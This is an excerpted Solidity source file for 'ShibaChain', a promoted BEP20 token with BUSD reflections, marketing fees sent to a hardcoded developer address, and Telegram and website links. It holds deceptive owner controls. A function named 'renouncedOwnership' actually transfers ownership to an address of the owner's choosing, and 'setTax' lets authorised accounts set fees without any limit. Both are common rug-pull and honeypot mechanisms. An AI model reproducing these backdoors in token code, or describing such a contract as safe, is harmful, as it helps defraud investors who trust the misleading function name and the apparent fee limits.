...
/*
Telegram : https://t.me/ShibaChain_bsc
Website : https://shiba-chain.xyz/
Twitter : https://twitter.com/shibachainbsc
*/
...
abstract contract Auth {
     ...
     */
    function renouncedOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 Reflection = IBEP20(0xb86AbCb37C3A4B64f74f59301AFF131a1BEcC787); // BUSD
    ...
    function deposit() external payable override onlyToken {
        uint256 balanceBefore = Reflection.balanceOf(address(this));
 
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(Reflection);
        ...
        uint256 amount = Reflection.balanceOf(address(this)).sub(balanceBefore);
    ...
    function distributeDividend(address shareholder) internal {
        ...
        if(amount > 0){
            ...
            Reflection.transfer(shareholder, amount);
...
contract ShibaChain is IBEP20, Auth {
    ...
    address _devAddress = 0x7b344C06f3B278E3d810BcbeAF828C7B74aB555E;
    
    string constant _name = "ShibaChain";
    string constant _symbol = "SHIBA";
    uint8 constant _decimals = 6;

    uint256 _totalSupply = 1 * 10**15 * (10 ** _decimals);
    uint256 public _maxTxAmount = _totalSupply * 100 / 100;
    uint256 public _maxWalletToken = ( _totalSupply * 1 ) / 40;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = _devAddress;
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountBNBReflection = amountBNB.mul(reflecFee).div(totalBNBFee);
    ...
    function setTax(uint256 _lpFee, uint256 _reflecFee, uint256 _marketingFee, uint256 _feeDenominator) external authorized {
        lpFee = _lpFee;
        reflecFee = _reflecFee;
        marketingFee = _marketingFee;
        totalFee = _lpFee.add(_reflecFee).add(_marketingFee);
